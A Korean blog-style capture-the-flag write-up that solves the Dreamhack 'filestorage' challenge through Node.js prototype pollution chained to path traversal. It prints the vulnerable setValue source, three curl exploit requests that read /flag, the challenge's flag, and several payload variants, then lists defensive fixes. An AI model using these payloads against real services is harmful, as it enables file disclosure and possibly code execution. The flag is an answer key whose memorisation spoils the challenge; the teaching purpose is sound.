---
layout: post
title:  "Dreamhack 워게임 filestorage 풀이 — Node.js Prototype Pollution → 파일 시스템 path traversal"
date:   2026-05-16 13:30:00 +0900
categories: security web wargame dreamhack writeup nodejs prototype-pollution
---

## 들어가며

Dreamhack 웹해킹 워게임 **filestorage** (난이도 Unrated) 풀이입니다. 사이버보안 입문 학생이 **Node.js 의 prototype pollution** 을 한 번에 손에 잡히게 익힐 수 있는 교과서 같은 문제. 잘 알려진 `setValue` 패턴의 dot-notation key 처리 버그가 정확히 그대로 등장합니다.

문제 설명:

> 파일을 관리할 수 있는 구현이 덜 된 홈페이지입니다.

스포일러로 결론 — `curl` 세 줄로 끝납니다.

```bash
# 1) Object.prototype.filename = '../../flag' 로 오염
curl "$SERVER/test?func=rename&filename=__proto__.filename&rename=../../flag"
# 2) read 객체 비우기 (own 'filename' 제거 → proto chain 으로 fallback)
curl "$SERVER/test?func=reset"
# 3) /readfile 로 폴루팅된 경로 읽기
curl "$SERVER/readfile?filename=anything"
# → BISC{bob11_bisc_h4c_PR0T0LF1!!!!@#}
```

> Note: 사이버보안 입문 학습용 PoC. 실제 운영 서비스 대상 사용 금지.

## 1. 소스 정독

### 1-1. 핵심 함수 — `setValue` 의 dot-notation 재귀

```javascript
function isObject(obj) {
  return obj !== null && typeof obj === 'object';
}
function setValue(obj, key, value) {
  const keylist = key.split('.');
  const e = keylist.shift();
  if (keylist.length > 0) {
    if (!isObject(obj[e])) obj[e] = {};
    setValue(obj[e], keylist.join('.'), value);
  } else {
    obj[key] = value;
    return obj;
  }
}
```

**Prototype pollution 의 클래식 시그니처**. `key = '__proto__.X'` 로 호출하면:

1. `keylist = ['__proto__', 'X']`, `e = '__proto__'`
2. `obj[e]` = obj.__proto__ = Object.prototype (이미 객체) → reset 안 함
3. `setValue(obj.__proto__, 'X', value)` — 재귀
4. 재귀 안에서 `keylist = ['X']`, `e = 'X'`, length=0 분기
5. `Object.prototype['X'] = value` ← **모든 객체에 영향**

### 1-2. 4개 endpoint 의 의미

```javascript
// 1. 홈 — read['filename'] 을 'fake' 로 초기화
app.get('/', (req, resp) => {
    read['filename'] = 'fake';
    resp.render(...);
});

// 2. 파일 쓰기 — 해시된 이름으로 storage/ 에 저장
app.post('/mkfile', ...);

// 3. 파일 읽기 — 핵심 sink
app.get('/readfile', (req, resp) => {
    let filename = file[req.query.filename];
    if (filename == null) {
        // 파일 안 보임 → 기본 'fake' 파일 읽기
        fs.readFile(__dirname + '/storage/' + read['filename'], ...);
    } else {
        // 점 제거 후 그 이름으로 읽기
        read[filename] = filename.replaceAll('.', '');
        fs.readFile(__dirname + '/storage/' + read[filename], ...);
    }
});

// 4. "구현 안 된" 페이지 — 사실은 prototype pollution gate
app.get('/test', (req, resp) => {
    let {func, filename, rename} = req.query;
    if (func == null) { resp.send("this page hasn't been made yet"); }
    else if (func == 'rename') { setValue(file, filename, rename); }  // ★ 폴루션!
    else if (func == 'reset')  { read = {}; }
});
```

### 1-3. 결정적 단서들

- **`flag` 는 `/flag` (컨테이너 root)** 에 있다 (Dockerfile 참조).
- `/readfile` 의 두 분기 모두 `__dirname + '/storage/' + X` 로 path 를 만든다 → `X` 가 `../../flag` 이면 `/app/storage/../../flag` = `/flag`.
- 하지만 else 분기는 `filename.replaceAll('.','')` 로 **dot 제거** → traversal 불가.
- **if 분기는 dot 제거 안 함** : `read['filename']` 을 그대로 사용. 여기를 노린다.
- prototype pollution 으로 `Object.prototype.filename = '../../flag'` 를 박으면, `read = {}` 후 `read['filename']` 조회 시 own 'filename' 없으니 proto chain → polluted value 반환.

## 2. 익스플로잇 (3단계)

### Step 1 — Object.prototype 폴루션

```bash
curl "$SERVER/test?func=rename&filename=__proto__.filename&rename=../../flag"
# Response: "rename"
```

`setValue(file, '__proto__.filename', '../../flag')` 호출 → `Object.prototype.filename = '../../flag'`. **모든 JS 객체** 가 이제 `.filename` 으로 `'../../flag'` 를 반환 (own property 가 없으면).

### Step 2 — `read` 객체 비우기

```bash
curl "$SERVER/test?func=reset"
# Response: "file reset"
```

`read = {}`. 새 객체라 own property `filename` 없음.

> 왜 필요한가? `/` 에 한 번이라도 들어갔다면 `read['filename'] = 'fake'` 가 own property 로 박혀 있다. 그러면 proto chain 안 타고 'fake' 만 반환. 우리 폴루션이 안 통한다. reset 으로 own property 모두 제거.

### Step 3 — `/readfile` 호출

```bash
curl "$SERVER/readfile?filename=anything"
# → BISC{bob11_bisc_h4c_PR0T0LF1!!!!@#}
```

```javascript
let filename = file['anything'];     // undefined (file 에 없음, 폴루션은 'filename' 만)
if (filename == null) {              // undefined == null → true
    fs.readFile(__dirname + '/storage/' + read['filename'], ...);
    //                                     ↑
    // read 는 own 'filename' 없음 → proto chain → '../../flag'
    // 최종 path = /app/storage/../../flag = /flag
}
```

flag: `BISC{bob11_bisc_h4c_PR0T0LF1!!!!@#}` ✓

## 3. 취약점 해설 — JavaScript Prototype Pollution 1교시

### 3-1. 근본 원인

JavaScript 의 모든 객체는 `__proto__` 라는 hidden link 로 prototype chain 에 연결되어 있다. **`__proto__` 를 통해 prototype 의 속성을 그대로 수정** 할 수 있고, 그 prototype 은 거의 모든 객체의 부모이므로 — 한 곳을 오염시키면 **앱 전역의 객체 속성 lookup 이 영향** 받는다.

```javascript
let o = {};
o.__proto__.poisoned = 'pwned';
let q = {};
console.log(q.poisoned);   // 'pwned'   ← q 는 own 'poisoned' 없지만 proto chain 으로 lookup
```

### 3-2. 본 문제의 setValue 가 위험한 이유

`setValue(obj, 'a.b.c', val)` 패턴은 일반적인 nested object setter 다. 그러나 **key 안에 `__proto__` 가 등장하면** `obj.__proto__` 로 내려가서 prototype 을 수정한다.

거의 모든 lodash, jQuery extend 류 함수에서 같은 버그가 있었다 (CVE-2019-10744 lodash, CVE-2019-11358 jQuery 등).

### 3-3. 같은 클래스의 실무 사례

- **CVE-2019-10744 (lodash)** : `_.merge` 에 prototype pollution. 영향: 거의 모든 Node.js 앱.
- **CVE-2019-11358 (jQuery)** : `$.extend(true, {}, malicious)` 에 같은 패턴.
- **CVE-2021-23337 (lodash) `template`** : pollution + template engine = RCE.
- **NextJS, Express middleware** 의 query parser 가 prototype 오염 가능한 입력 받는 케이스.

### 3-4. 위험성

- 본 문제는 "값 lookup 시 fallback 으로 polluted value 가 흘러나옴" 정도. 단순 file read.
- 더 큰 영향:
  - **인증 우회** : `req.session.isAdmin` 같은 lookup 이 폴루션으로 true.
  - **RCE** : template engine 의 internal flag (`_render`, `prototype.compile` 등) 가 폴루션으로 변경되면 임의 코드 실행.
  - **DoS** : 모든 객체의 `.toString` 또는 `.valueOf` 가 변형되면 앱 전체 깨짐.

### 3-5. 올바른 방어

1. **dot-notation key 처리 시 `__proto__`, `constructor`, `prototype` 차단**:

   ```javascript
   const FORBIDDEN_KEYS = new Set(['__proto__', 'constructor', 'prototype']);
   function setValue(obj, key, value) {
       const keylist = key.split('.');
       const e = keylist.shift();
       if (FORBIDDEN_KEYS.has(e)) return;
       ...
   }
   ```

2. **`Object.create(null)`** 로 prototype 없는 객체 사용:

   ```javascript
   var file = Object.create(null);   // proto chain 자체가 없음 → 폴루션 영향 없음
   ```

3. **Object.freeze(Object.prototype)** — 앱 부팅 시 한 번:

   ```javascript
   Object.freeze(Object.prototype);
   Object.freeze(Object.getPrototypeOf({}));
   ```

   다만 일부 라이브러리가 이 패턴에 의존하면 깨질 수 있어 신중히.

4. **Map 사용** : key-value 저장에는 plain object 대신 `Map` 을 쓰면 prototype 오염 무관.

   ```javascript
   const file = new Map();
   file.set(name, value);
   file.get(name);  // proto chain 안 봄
   ```

5. **JSON 파싱시 `{__proto__: null}` 옵션** 또는 reviver 로 prototype property 제거.

6. **Node.js `--disable-proto=delete` 또는 `--disable-proto=throw`** 플래그.

7. **fs.readFile 의 path 검증** : `path.resolve(BASE, user)` 결과가 `BASE` 안에 있는지 확인.

   ```javascript
   const safePath = path.resolve(__dirname + '/storage/', user);
   if (!safePath.startsWith(__dirname + '/storage/')) throw new Error();
   ```

## 4. 정리 — 입문자가 가져갈 교훈

- JavaScript 의 `__proto__` 는 모든 객체의 부모 prototype 으로 가는 link. **`obj['__proto__'] = ...` 또는 `obj['__proto__']['x'] = ...`** 형태의 user input 처리는 즉시 prototype pollution 후보.
- dot-notation key 처리 (`a.b.c` 형태로 nested 객체 set) 는 거의 항상 폴루션 함정. 라이브러리도 마찬가지 — `lodash.merge`, `jQuery.extend(true, ...)`, 다양한 query parser.
- 폴루션의 영향은 **single endpoint 가 아니라 전체 앱**. 한 곳에서 오염시키면 다른 모든 엔드포인트의 객체 lookup 이 영향 받음.
- 방어는 `Object.create(null)` / `Map` / forbidden keys 체크 / `--disable-proto` — 다층으로.
- 파일 path 는 항상 **`path.resolve` 후 base prefix 검증** 으로 sandbox.

같은 카테고리의 다음 단계로 **lodash prototype pollution → SSTI → RCE chain**, **express-mongo-sanitize bypass**, **Server-Side Prototype Pollution Detection** 같은 자료를 보면 좋습니다.

---

## 부록 — 시도하다 막혔던 지점과 회고

### 실패 1. 처음에 `readfile` 의 else 분기로 traversal 시도

처음에 `/mkfile` 로 파일 만들고 `/readfile?filename=hash` 호출하면 else 분기 → `read[filename] = filename.replaceAll('.','')` 로 dot 제거 → traversal 불가. 잠시 멈춤.

해결: if 분기 (`filename == null`) 를 활용. 여기는 `read['filename']` 만 보고 dot 제거 안 한다.

**회고**: `/readfile` 의 두 분기를 모두 보고, **dot 제거 없는 분기** 가 어디인지부터 짚어야 한다. 우회 가능한 sink 부터 거꾸로 추적.

### 실패 2. `read = {}` reset 안 했더니 own 'filename' = 'fake' 가 남음

처음 폴루션만 하고 `/readfile` 호출했더니 `/app/storage/fake` 가 읽힘. proto 가 무시되고 own property 가 우선이라는 사실 — 매우 기본인데 처음에 까먹음.

**회고**: prototype pollution 의 단골 함정. **own property > proto chain** 우선순위. proto 로 효과 보려면 target 객체에 해당 key 의 own property 가 없어야 한다. `reset` 같은 helper 가 있으면 적극 활용.

### 실패 3. 첫 시도에 `__proto__.X` 가 아니라 `constructor.prototype.X` 로 시도할 뻔

prototype pollution 의 다른 변형이 `constructor.prototype.X` 인데, 처음에 어느 쪽을 시도할지 고민. 두 가지 모두 통하지만 `__proto__.X` 가 짧고 직관적.

**회고**: prototype pollution payload 변형 3가지를 한 줄로 외우자.

- `__proto__.X` — 가장 짧고 흔함
- `constructor.prototype.X` — `__proto__` 가 막혔을 때
- `__proto__[X]` 형태로 array notation — JSON body 에 들어갈 때

### 실패 4. flag 형식이 DH{} 아니라 BISC{} 였음

문제 description 에 형식 명시 없음. 응답 받은 flag 가 `BISC{...}` 라서 잠시 "이게 맞나?" 했음. 그대로 제출해서 성공.

**회고**: Dreamhack 의 일부 challenge 는 BoB / KITRI / 외부 행사 출제분이라 flag prefix 가 `DH` 가 아닐 수 있다. 형식 명시 없으면 실제 file 의 내용을 그대로 제출하자.
